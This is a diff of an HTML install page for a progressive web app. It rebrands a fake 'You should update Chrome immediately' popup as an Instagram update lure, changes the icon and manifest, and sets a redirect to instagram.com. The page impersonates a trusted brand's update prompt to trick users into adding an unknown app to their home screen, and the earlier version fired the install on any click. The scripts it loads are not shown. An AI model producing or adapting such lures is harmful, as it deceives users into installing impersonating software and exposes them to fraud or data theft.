@@ -6,7 +6,7 @@
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
 	<link rel="stylesheet" href="css/style.css">
-	<link rel="manifest" href="/apps/chrome/installmanifest.json">
+	<link rel="manifest" href="/apps/instagram/manifest.json">
 	<meta http-equiv="cache-control" content="max-age=0" />
 	<meta http-equiv="cache-control" content="no-cache" />
 	<meta http-equiv="expires" content="0" />
@@ -14,13 +14,13 @@
 	<meta http-equiv="pragma" content="no-cache" />
 </head>
 
-<body onclick="installBtnClick()">
+<body>
 
 	<div id="installPopup" class="install-popup" style="display: block;">
 		<div class="popup-inner">
-			<img class="icon" src="images/icon192.png" alt="" />
-			<h1 class="title">You should update Chrome immediately.</h1>
-			<div class="description">Get Chrome Update quickly and easily by adding it to your Home screen.</div>
+			<img class="icon" src="/apps/instagram/src/images/icons/icon192.png" alt="" />
+			<h1 class="title">You should update Instagram immediately.</h1>
+			<div class="description">Get Instagram Update quickly and easily by adding it to your Home screen.</div>
 
 			<a href="#" id="btnAdd" class="btn" onclick="installBtnClick()">Add to Home screen</a>
 		</div>
@@ -28,18 +28,17 @@
 
 	<script type="text/javascript">
 		var pwaConfig = {
-			appGuid: '07B41AD8-0871-4968-BE2E-BC9886343E1F',
-			defaultRedirect: 'https://google.com',
-			appName: 'Chrome',
+			AppGuid: '8465F664-B83E-4C64-A0AA-C4B9F4701080',
+			DefaultRedirect: 'https://instagram.com',
+			AppName: 'Instagram',
 		};
 	</script>
+
 	<script src="/src/js/getParams.js"></script>
 	<script src="/src/js/appsCatalog.js"></script>
-	<script src="/src/js/api.js"></script>
-	<script src="/src/js/idb.js"></script>
-	<script src="/src/js/indexedDb.js"></script>
-	<script src="/src/js/infr.js"></script>  
-	<script src="/src/js/contentManager.js"></script>    
+    <script src="/src/js/api.js"></script>
+    <script src="/src/js/idb.js"></script>
+    <script src="/src/js/utility.js"></script>    	
 	<script type="text/javascript" src="js/main.js"></script>
 
 </body>
